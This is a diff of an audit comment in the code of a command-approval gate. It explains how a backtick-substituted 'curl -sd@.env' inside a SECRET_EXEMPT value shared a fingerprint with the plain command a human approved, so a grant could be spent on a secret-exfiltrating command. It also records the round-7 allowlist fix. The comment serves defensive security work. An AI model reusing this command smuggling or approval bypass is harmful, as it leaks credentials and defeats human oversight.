@@ -160,12 +160,18 @@ id the human inspected and the id the flagged re-run computes are IDENTICAL
     fingerprint("SECRET_EXEMPT=`curl${IFS}-sd@.env${IFS}...` cat .env")   = 648b13a0a3555ec5   <- SAME
 
 grant(id for the plain form), then submit the backtick form: ALLOWED, and the
-grant was consumed. The `$( )` form of the same idea happens to be refused
-already by the multi-segment check below, but that is an ACCIDENT of shlex
-splitting on parens, not a defence built for this -- is_approvable() returns
-True for it when the multi-segment check is bypassed, exactly like the
-backtick form. There is no reason to believe every shell metacharacter has an
-equally lucky accident waiting for it.
+grant was consumed. PRE-round-7, the `$( )` form of the same idea happened to
+be refused already by the multi-segment check below, but that was an ACCIDENT
+of shlex splitting on parens, not a defence built for this -- is_approvable()
+returned True for it when the multi-segment check was bypassed, exactly like
+the backtick form. There was no reason to believe every shell metacharacter
+had an equally lucky accident waiting for it.
+
+CORRECTION, round 7: the allowlist added below now refuses the `$( )` form
+first, deliberately, before the multi-segment check ever runs -- see
+unapprovable_reason()'s allowlist check, which is load-bearing, not lucky.
+The paragraph above describes the pre-round-7 state; it is kept for the
+audit trail, not because it is still true.
 
 Fix: unapprovable_reason() now allowlists the value -- plain letters, digits,
 and `. _ , : / -`, nothing else -- rather than denylisting dangerous
